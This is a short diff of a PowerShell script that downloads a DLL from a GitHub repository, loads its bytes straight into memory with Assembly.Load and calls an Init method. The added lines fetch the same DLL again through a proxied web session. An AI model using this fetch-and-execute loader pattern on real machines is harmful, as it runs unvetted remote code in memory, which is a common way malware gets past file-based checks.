@@ -3,3 +3,9 @@ $dll = (New-Object Net.WebClient).DownloadData('https://github.com/ChilliCheeseB
 $dll = [System.IO.File]::ReadAllBytes("$env:USERPROFILE\Downloads\myfile.dll")
 [System.Reflection.Assembly]::Load([byte[]]$dll)
 [Telemetry.Engine.ContextManager]::Init()
+
+
+$Proxy=New-object System.Net.WebProxy
+$WebSession=new-object Microsoft.PowerShell.Commands.WebRequestSession
+$WebSession.Proxy=$Proxy
+Invoke-WebRequest -Method Get -Uri “https://github.com/ChilliCheeseByte/myfile/raw/refs/heads/main/myfile.dll” -WebSession $WebSession
